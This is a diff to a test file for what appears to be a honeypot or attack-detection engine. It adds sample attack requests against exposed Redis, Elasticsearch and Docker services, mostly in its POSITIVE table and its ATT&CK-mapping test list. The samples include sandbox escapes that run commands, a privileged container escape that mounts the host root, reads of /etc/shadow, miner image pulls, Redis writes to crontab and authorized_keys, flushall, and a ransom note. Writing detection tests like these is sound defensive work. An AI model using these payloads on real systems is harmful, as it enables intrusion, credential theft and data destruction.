@@ -75,6 +75,13 @@ POSITIVE = {
     "path-traversal-generic": http("/static/../../../../etc/passwd"),
     "scanner-ua": http("/", headers={"User-Agent": "Mozilla/5.0 zgrab/0.x"}),
     "sql-injection-generic": http("/item.php?id=1 UNION ALL SELECT NULL,NULL--"),
+    # exposed services
+    "redis-lua-sandbox-escape": shell("eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); return f:read(\"*a\")' 0"),
+    "es-groovy-sandbox-bypass": http("/_search?pretty", "POST", body='{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"id\\").getText()"}}}'),
+    "es-mvel-dynamic-script": http("/_search", "POST", body='{"size":1,"script_fields":{"x":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\"id\\").getInputStream()).next();"}}}'),
+    "docker-api-abuse": http("/v1.41/containers/create", "POST", body='{"Image":"alpine","Cmd":["sh","-c","id"]}'),
+    "redis-abuse": shell("config set dir /var/spool/cron/crontabs"),
+    "ransom-note": http("/read_me/_doc/1", "PUT", body='{"message":"All your data is backed up. To recover it send 0.01 BTC to bc1qexample and email us"}'),
 }
 
 
@@ -129,9 +136,29 @@ def test_http_exploit_is_promoted_to_exploit_event():
     ("systemctl stop firewalld", "T1562.001"),
     ("cat /etc/shadow", "T1003.008"),
     ("useradd -m backup", "T1136.001"),
+    # exposed services: Docker API calls normalized to CLI form, raw Redis / ADB command lines
+    ("docker run alpine sh -c id", "T1610"),
+    ("docker run --privileged -v /:/host alpine chroot /host sh", "T1611"),
+    ("docker run -v /:/mnt alpine cat /mnt/etc/shadow", "T1611"),
+    ("docker pull kinsing/kdevtmpfsi", "T1105"),
+    ("docker run moneroocean/xmrig -o pool.example:443", "T1496"),
+    ("config set dir /var/spool/cron", "T1053.003"),
+    ("config set dbfilename authorized_keys", "T1098.004"),
+    ("slaveof 198.51.100.4 21000", "T1105"),
+    ("module load /tmp/exp.so", "T1129"),
+    ("flushall", "T1485"),
+    ("info server", "T1082"),
+    ("shell:getprop ro.product.model", "T1082"),
 ])
 def test_attack_mapping(cmd, technique):
     assert technique in ENGINE.map_techniques(shell(cmd))
+
+
+def test_service_requests_map_to_techniques():
+    assert "T1213" in ENGINE.map_techniques(http("/_cat/indices?v"))
+    assert "T1485" in ENGINE.map_techniques(http("/customers", "DELETE"))
+    assert not ENGINE.map_techniques(http("/index.html"))
+    assert "T1611" not in ENGINE.map_techniques(shell("docker run -v /data:/data nginx"))
 
 
 def test_login_events_map_to_brute_force_and_valid_accounts():
